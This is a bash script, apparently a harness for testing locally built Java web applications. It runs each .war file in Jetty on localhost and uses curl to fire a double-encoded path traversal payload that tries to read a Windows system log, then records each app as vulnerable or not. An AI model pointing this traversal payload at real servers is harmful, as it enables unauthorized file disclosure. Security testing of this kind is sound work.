#!/bin/bash
#This script can be used to test exploits on Java applications. Build the vulnerable Java application then use this script to test using a payload
java="C:\Program Files (x86)\Java\jdk1.8.0_202"
url="http://localhost:8080/"
autofire="resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/Windows/DtcInstall.log"
vulnerability="test"
logid=$RANDOM
for d in *.war
do
( printf "\nTesting: $d\n\n"; /mnt/c/Program\ Files\ \(x86\)/Java/jdk1.8.0_202/bin/java.exe -DSTOP.PORT=9988 -DSTOP.KEY=secret -jar jetty-runner-9.4.8.v20180619.jar $d &
sleep 5
printf "\nCURLer 0.1\nExploit for $vulnerability\n\n" | tee -a $logid.log
if [ -z "$1" ]; then
  echo "ERROR: No URL or payload supplied." | tee -a $logid.log
  exit 1
elif [ "$1" == "test" ]; then
  echo "Running in test mode..." | tee -a $logid.log
fi
printf "\nConnecting to host...\n" | tee -a $logid.log
sleep 1
if [ $(curl -o -I -L -s -w "%{http_code}" $url) -eq 404 ]; then
  echo "ERROR: 404 Page not found" | tee -a $logid.log
  sleep 4
  exit
elif [ $(curl -o -I -L -s -w "%{http_code}" $url) -eq 200 ]; then
  printf "\n\nConnected to web page.\n" | tee -a $logid.log
  exploit='curl -O -sSf $url$autofire'
  printf "\n\n"
  if ! [ $(curl -o -I -L -s -w "%{http_code}" -sSf $url$autofire) -eq 200 ]; then
    printf "ERROR: Check Payload - autofire.sh <url> <payload>" | tee -a $logid.log
    echo "RESULT: $d NOT VULNERABLE to $vulnerability" | tee -a $vulnerability.$logid.log $logid.log
    printf "\n\n"
    ps -ef | grep jetty | awk '{print $2}' | xargs kill -9
    sleep 4
    exit 2
  else
    curl -H "Cache-Control: no-cache" -O $url$autofire & curl -H "Cache-Control: no-cache" $url$autofire -o "OUTPUT-$d.file"
    echo "RESULT: $d VULNERABLE to $vulnerability" | tee -a $vulnerability.$logid.log $logid.log
    printf "\n\n"
    ps -ef | grep jetty | awk '{print $2}' | xargs kill -9
    echo $?
    sleep 4
    exit 0
  fi
else
  printf "\nERROR: $d UNKNOWN\n\n" | tee -a $vulnerability.$logid.log $logid.log
  ps -ef | grep jetty | awk '{print $2}' | xargs kill -9
  sleep 4
  exit
fi )
done